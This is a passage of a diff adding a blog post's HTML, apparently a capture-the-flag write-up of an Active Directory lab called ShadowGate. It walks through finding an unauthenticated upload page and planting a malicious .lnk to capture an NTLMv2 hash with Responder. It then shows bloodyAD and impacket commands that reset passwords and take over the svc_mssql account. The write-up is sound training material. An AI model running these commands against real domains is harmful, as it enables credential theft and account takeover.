+2026/08/07 10:52:04 &gt;  Done! Tested 7 usernames (5 valid) in 0.326 seconds
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/valid-usernames_hu_313071f3b15df01e.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/valid-usernames_hu_f45a7d10307c6d3.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/valid-usernames_hu_796cce832172d594.webp 954w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/valid-usernames_hu_796cce832172d594.webp 954w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="954"
+        height="352"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/valid-usernames_hu_5bc931f7a20d9fea.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/valid-usernames_hu_909334c065527191.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/valid-usernames_hu_5bc931f7a20d9fea.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/valid-usernames.png 954w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/valid-usernames.png 954w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I found that none of the accounts were ASREProastable (pre-authentication not disabled).</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/asrep-test_hu_aa81635bc898d26e.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/asrep-test_hu_73ad659f563ba333.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/asrep-test_hu_336e0fdee6eddcc2.webp 866w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/asrep-test_hu_336e0fdee6eddcc2.webp 866w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="866"
+        height="133"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/asrep-test_hu_2ad4f7ccc4243c15.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/asrep-test_hu_a5dfd5d863a25e81.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/asrep-test_hu_2ad4f7ccc4243c15.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/asrep-test.png 866w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/asrep-test.png 866w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="the-upload-portal" class="relative group">The Upload Portal <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-upload-portal" aria-label="Anchor">#</a></span></h3><p>I ran a directory brute-force with <strong>Feroxbuster</strong> on <code>dev.shadowgate.local</code>, which surfaced an interesting endpoint, <code>upload.aspx</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/feroxbuster-upload-aspx_hu_3281d5b1b27fcdc2.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/feroxbuster-upload-aspx_hu_79b4dc905187dfd3.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/feroxbuster-upload-aspx_hu_9b2ded2f1459b0c8.webp 969w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/feroxbuster-upload-aspx_hu_9b2ded2f1459b0c8.webp 969w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="969"
+        height="78"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/feroxbuster-upload-aspx_hu_9366dfa71f70d433.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/feroxbuster-upload-aspx_hu_86e0e3ff3384f021.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/feroxbuster-upload-aspx_hu_9366dfa71f70d433.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/feroxbuster-upload-aspx.png 969w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/feroxbuster-upload-aspx.png 969w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Visiting the page, I gained access to the <code>mitch.r</code> account without requiring authentication, completely bypassing the login page. The page also revealed the location where uploaded files are stored and processed — a <code>dev</code> folder that doubles as an SMB share.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/upload-portal-access_hu_1147c14e057fad4e.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/upload-portal-access_hu_12d4dcdecf3b4058.webp 660w
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/upload-portal-access_hu_ad4b2f1b77d940d8.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/upload-portal-access_hu_290e2f74100f71ed.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1889"
+        height="975"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/upload-portal-access_hu_1057261307bf3dde.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/upload-portal-access_hu_75891924270c5d6.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/upload-portal-access_hu_1057261307bf3dde.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/upload-portal-access_hu_5361ce16a199e914.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/upload-portal-access_hu_8796cf0eed126fc6.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-3-initial-access" class="relative group">Step 3: Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-initial-access" aria-label="Anchor">#</a></span></h2><p>Since the upload portal runs in the context of <code>mitch.r</code> and the processed files are stored in an SMB share I have write access to, I crafted a <code>.lnk</code> file to trigger an SMB connection back to me when the file is accessed. I started <strong>Responder</strong> to listen for the connection.</p>
+<pre tabindex="0"><code>sudo responder -dvw -I tun0
+</code></pre><p>The tool used to generate the malicious <code>.lnk</code> file:</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool_hu_ba0a21dc910a145c.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool_hu_d3ec8daedff97957.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool_hu_3822f88d1984e21e.webp 821w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool_hu_3822f88d1984e21e.webp 821w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="821"
+        height="150"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool_hu_24b1432ebdf0aa8d.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool_hu_4c50328818f82666.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool_hu_24b1432ebdf0aa8d.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool.png 821w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool.png 821w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Uploading the file:</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-upload_hu_3242bbfc7113a7c4.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="572"
+        height="216"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-upload.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>After hitting issues with the first tool, I used a modified variant to craft the payload.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool-modification_hu_575f1512609e7202.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool-modification_hu_ff01590d7fc4f119.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool-modification_hu_9911737c83a56985.webp 845w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool-modification_hu_9911737c83a56985.webp 845w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="845"
+        height="324"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool-modification_hu_50641d26a171bdf5.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool-modification_hu_9836973c344810ec.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool-modification_hu_50641d26a171bdf5.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool-modification.png 845w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/lnk-tool-modification.png 845w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The uploaded file triggered an SMB authentication attempt, and Responder captured the NTLMv2 hash for the user running the file-processing service.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlm-captured_hu_8657de653b44189c.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlm-captured_hu_ed6c520ecf6628c8.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlm-captured_hu_8601ddb95c23f3bc.webp 953w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlm-captured_hu_8601ddb95c23f3bc.webp 953w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="953"
+        height="326"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlm-captured_hu_fc4b7d6f5a1f1474.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlm-captured_hu_f5f2162d82ec4408.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlm-captured_hu_fc4b7d6f5a1f1474.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlm-captured.png 953w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlm-captured.png 953w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I successfully cracked the captured hash offline, revealing the plaintext password for <code>mitch.r</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/hash-cracked_hu_ba7fb7a64148cb82.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/hash-cracked_hu_59dd41d7f402dc74.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/hash-cracked_hu_b0763b387c074641.webp 949w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/hash-cracked_hu_b0763b387c074641.webp 949w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="949"
+        height="157"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/hash-cracked_hu_fc4d410abb3b3df7.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/hash-cracked_hu_729fa43d76b6865e.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/hash-cracked_hu_fc4d410abb3b3df7.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/hash-cracked.png 949w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/hash-cracked.png 949w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="smb-share-enumeration" class="relative group">SMB Share Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#smb-share-enumeration" aria-label="Anchor">#</a></span></h3><p>With valid credentials, I enumerated the SMB shares.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-shares-authenticated_hu_445738329270a238.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-shares-authenticated_hu_ac3dd5c330a239af.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-shares-authenticated_hu_93ab6a23385bb599.webp 954w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-shares-authenticated_hu_93ab6a23385bb599.webp 954w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="954"
+        height="222"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-shares-authenticated_hu_d49f1a4131ec0e6.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-shares-authenticated_hu_e5e80de7dbb504b8.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-shares-authenticated_hu_d49f1a4131ec0e6.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-shares-authenticated.png 954w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/smb-shares-authenticated.png 954w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I found nothing interesting inside the share itself.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/share-content_hu_c858d80cad1cabbf.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/share-content_hu_5e81400e8bc0123c.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/share-content_hu_98bd27b5948f3d4a.webp 852w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/share-content_hu_98bd27b5948f3d4a.webp 852w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="852"
+        height="160"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/share-content_hu_8b96aa9c20d18e2a.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/share-content_hu_c3270468267c3f71.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/share-content_hu_8b96aa9c20d18e2a.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/share-content.png 852w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/share-content.png 852w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="bloodhound-collection" class="relative group">BloodHound Collection <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#bloodhound-collection" aria-label="Anchor">#</a></span></h3><p>I performed a domain-wide collection to map out attack paths.</p>
+<pre tabindex="0"><code>bloodyAD --host SG-DC01 -d shadowgate.local -u &#39;mitch.r&#39; -p &#39;&lt;REDACTED&gt;&#39; get bloodhound
+</code></pre><p>BloodHound revealed that <code>mitch.r</code> has <strong>ForceChangePassword</strong> outbound object control over two users: <code>milo.w</code> and <code>ryan.j</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bloodhound-force-password-change_hu_ae92ce1b8766f56.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/bloodhound-force-password-change_hu_8ec2c30e3858f9e0.webp 660w
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bloodhound-force-password-change_hu_ceec2a44c7650acf.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bloodhound-force-password-change_hu_9c866421b777d7b8.webp 1132w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1132"
+        height="459"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/bloodhound-force-password-change_hu_dca58b98e7125d1f.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bloodhound-force-password-change_hu_73d66d2c36c9f154.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/bloodhound-force-password-change_hu_dca58b98e7125d1f.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bloodhound-force-password-change_hu_68c06f228c1f373f.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bloodhound-force-password-change.png 1132w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-4-privilege-escalation--taking-over-the-mssql-service-account" class="relative group">Step 4: Privilege Escalation — Taking Over the MSSQL Service Account <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-privilege-escalation--taking-over-the-mssql-service-account" aria-label="Anchor">#</a></span></h2><p>I abused the ForceChangePassword primitive with <strong>BloodyAD</strong> to reset the passwords of both controlled users.</p>
+<pre tabindex="0"><code>bloodyAD --host &lt;dc&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; set password &lt;target_user&gt; &#39;&lt;newpassword&gt;&#39;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-1_hu_8e1275ac4080e523.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-1_hu_f816de752a9e6691.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-1_hu_1300bf7ba5eaee49.webp 942w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-1_hu_1300bf7ba5eaee49.webp 942w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="942"
+        height="172"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-1_hu_c83b2b7e8e77cbe2.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-1_hu_54c3e64696442f26.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-1_hu_c83b2b7e8e77cbe2.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-1.png 942w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-1.png 942w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-2_hu_8f13f002f3e4f605.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-2_hu_fc741032a679aab0.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-2_hu_eda699b0e487956d.webp 977w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-2_hu_eda699b0e487956d.webp 977w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="977"
+        height="92"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-2_hu_fb5373eedb119bf4.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-2_hu_abebe933f5fce753.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-2_hu_fb5373eedb119bf4.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-2.png 977w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-change-2.png 977w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>BloodHound showed that <code>milo.w</code> has outbound object control over the <code>svc_mssql</code> account, so I made this user the focus since <code>ryan.j</code> was a dead end.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-object-control_hu_a02cd129b68e9dfe.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-object-control_hu_49e79a347a178234.webp 660w
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-object-control_hu_89885d8821b91567.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-object-control_hu_c5c7cd2374b742fe.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1373"
+        height="372"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-object-control_hu_9b6608b482ec2b6.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-object-control_hu_869aa2f5e53284d5.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-object-control_hu_9b6608b482ec2b6.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-object-control_hu_d20106c302f6a897.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-object-control_hu_8c4f7a6748972f9d.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-target_hu_4539e1549849d677.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="401"
+        height="373"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/milo-target.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>First, I took ownership of the <code>svc_mssql</code> account using the <code>WriteOwner</code> primitive.</p>
+<pre tabindex="0"><code>impacket-owneredit -action write -new-owner &#39;milo.w&#39; -target &#39;svc_mssql&#39; &#39;shadowgate.local/milo.w:&lt;REDACTED&gt;&#39; -dc-ip 10.1.44.124
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/take-ownership_hu_d5394e24ced7c978.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/take-ownership_hu_98f76e6e1c2e5904.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/take-ownership_hu_68ca96024d34bcb8.webp 948w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/take-ownership_hu_68ca96024d34bcb8.webp 948w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="948"
+        height="218"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/take-ownership_hu_f2b7f923a0f02919.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/take-ownership_hu_8b23c5902856ba80.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/take-ownership_hu_f2b7f923a0f02919.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/take-ownership.png 948w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/take-ownership.png 948w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Then I granted full control to <code>milo.w</code> via a DACL write.</p>
+<pre tabindex="0"><code>impacket-dacledit -action write -rights FullControl -principal &#39;milo.w&#39; -target &#39;svc_mssql&#39; &#39;shadowgate.local/milo.w:&lt;REDACTED&gt;&#39; -dc-ip 10.1.44.124
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/dacl-full-control_hu_9be9faa0e19b2427.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/dacl-full-control_hu_c0b8f7b563f73500.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/dacl-full-control_hu_85176bfe33e76c87.webp 931w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/dacl-full-control_hu_85176bfe33e76c87.webp 931w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="931"
+        height="115"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
